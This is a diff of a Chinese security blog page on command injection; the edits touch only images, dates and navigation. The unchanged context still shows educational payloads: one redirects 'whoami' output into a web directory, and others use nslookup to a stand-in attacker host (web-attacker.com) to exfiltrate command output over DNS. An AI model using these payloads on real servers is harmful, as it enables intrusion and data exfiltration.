@@ -50,13 +50,13 @@
 <meta property="og:site_name" content="早点睡zZZ">
 <meta property="og:description" content="简介 命令注入通常因为指Web应用在服务器上拼接系统命令而造成的漏洞。 该类漏洞通常出现在调用外部程序完成一些功能的情景下。比如一些Web管理界面的配置主机名&#x2F;IP&#x2F;掩码&#x2F;网关、查看系统信息以及关闭重启等功能，或者一些站点提供如ping、nslookup、提供发送邮件、转换图片等功能都可能出现该类漏洞。 我的理解是：在完成 web 网页的一些功能时，需要执行系统命令。而攻击者通过控制输入，使服务器">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/GhDemi/Picture@main/BlogImg/wallhaven-lq1qwl.jpg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/GhDemi/Picture@main/BlogImg/picspree-497950.jpg">
 <meta property="article:published_time" content="2022-04-20T12:42:56.000Z">
-<meta property="article:modified_time" content="2022-04-20T12:54:09.093Z">
+<meta property="article:modified_time" content="2022-04-28T07:37:47.543Z">
 <meta property="article:author" content="GhDemi">
 <meta property="article:tag" content="Point">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/GhDemi/Picture@main/BlogImg/wallhaven-lq1qwl.jpg">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/GhDemi/Picture@main/BlogImg/picspree-497950.jpg">
 
 
     
@@ -191,7 +191,7 @@
 <article class="post post__with-toc content-card">
     <div class="post__header">
     
-        <div class="post-thumbnail" style="background-image: url('https://cdn.jsdelivr.net/gh/GhDemi/Picture@main/BlogImg/wallhaven-lq1qwl.jpg');"></div>
+        <div class="post-thumbnail" style="background-image: url('https://cdn.jsdelivr.net/gh/GhDemi/Picture@main/BlogImg/picspree-497950.jpg');"></div>
     
 </div>
     <div class="post__content">
@@ -232,14 +232,14 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">注入点+||+whoami &gt; /var/www/static/whoami.txt+||</span><br><span class="line">filename=whoami.txt  //在网页请求文件内容的 URL 中修改参数</span><br></pre></td></tr></table></figure>
 <p>既然信息无法回显，那我们就将输出的信息进行重定向，将它输入到 &gt; 后的目标文件中去，然后利用浏览器去获取你所保存的文件。因此我们也可以看出来我们文件重定向的位置最好是在有为网页提供内容的文件夹下，这样我们可以直接通过修改该网页的 URL 来获取我们的文件。</p>
 <p>在获取图片的文件中请求我们所重定向的文件</p>
-<p><img src="%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20220420203811133.png" alt="image-20220420203811133"></p>
+<p><img src="image-20220420203811133.png" alt="image-20220420203811133"></p>
 </li>
 <li>
 <p>外带 OASI 技术(依靠 DNS 查找响应)</p>
 <p>可以仅仅只依靠是否发生了 DNS 查找，也可以是包含了命令结果的 DNS 查找。</p>
 <p>payload</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">注入点+||+nslookup+kgji2ohoyw.web-attacker.com+||  //不带信息的 DNS 触发</span><br><span class="line">注入点+||+nslookup+`whoami`.kgji2ohoyw.web-attacker.com+||  //带信息的 DNS 触发</span><br></pre></td></tr></table></figure>
-<p><img src="%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20220417144837824.png" alt="image-20220417144837824"></p>
+<p><img src="image-20220417144837824.png" alt="image-20220417144837824"></p>
 </li>
 </ol>
 
@@ -263,13 +263,27 @@
         
     </div>
  
-    <div class="post-footer__meta"><p>更新于 2022-04-20</p></div> 
+    <div class="post-footer__meta"><p>更新于 2022-04-28</p></div> 
     <div class="post-entry__tags"><a href="/tags/Point/" class="post-tags__link button"># Point</a></div> 
 </article>
 
 
     <div class="nav">
         <div class="nav__prev">
+            
+                <a href="/2022/04/28/Authentication%E2%80%94%E2%80%942FA/" class="nav__link">
+                    <div>
+                        <svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" width="24" height="24"><path d="M589.088 790.624L310.464 512l278.624-278.624 45.248 45.248L400.96 512l233.376 233.376z" fill="#808080"></path></svg>
+                    </div>
+                    <div>
+                        <div class="nav__label">
+                            Previous Post
+                        </div>
+                        <div class="nav__title">
+                            Authentication——2FA
+                        </div>
+                    </div>
+                </a>
             
         </div>
         <div class="nav__next">
